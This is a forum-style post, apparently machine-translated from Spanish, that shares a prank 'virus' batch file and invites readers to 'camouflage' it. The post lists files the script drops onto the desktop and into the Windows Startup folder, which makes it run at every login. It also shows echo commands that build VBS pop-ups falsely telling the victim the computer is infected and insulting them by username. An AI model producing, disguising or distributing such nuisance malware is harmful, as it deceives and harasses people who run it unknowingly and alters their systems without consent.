-Now they have some things that could affect your pc, i recomend try it with a Virtual Pc-

-The "virus" will be more powerful if your pc is more powerful -


Hi 
Before you hate this post, I know it is not a virus. It's just a bat file (and yes , i use the google traductor because i only know the basic english)


You can "camouflage" it in any way but I leave it to you to do it to your liking


If you want delete all of the archives of the "virus" after of start him:

C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\tittl.mp3

cd C:\Users\%username%\Desktop\ppppppppppppppp.bat

cd C:\Users\%username%\Desktop\s44ss1541DDDDD44.bat

cd C:\Users\%username%\Desktop\JAJAJAJAJA.vbs

cd C:\Users\%username%\Desktop\JAJAJAJAJ4.bat

cd C:\Users\%username%\Desktop\NoConfiesEnGenteDeInternet-60

cd C:\Users\%username%\Desktop\s2.bat

cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\notvi.vbs

and much others files but easy to find it

The texts of the file are in Spanish, if you want it in English simply replace the text by doing:

Select the bat file

Right click 

and click edit

Now go to 

"

echo X=MsgBox("Su equipo esta infectado",0+48,"Windows") >> notvi.vbs

echo X=MsgBox("Le recomendamos que..",0+48,"Windows") >> notvi.vbs

echo X=MsgBox("No confies en nadie",0+48,"%username% ") >> notvi.vbs

echo X=MsgBox("Jajajaja %username% , alto nombre de virgen ",0+48,"Created By 54n71") >> notvi.vbs

"

and chage it with

"

echo X=MsgBox("Your computer have a virus",0+48,"Windows") >> notvi.vbs

echo X=MsgBox("We recommend",0+48,"Windows") >> notvi.vbs

echo X=MsgBox("Trust nobody",0+48,"%username% ") >> notvi.vbs

echo X=MsgBox("hahahaha %username% , The most virgin name that I see in my life ",0+48,"Created By 54n71") >> notvi.vbs

"

there is more spanish text but they are insignificant
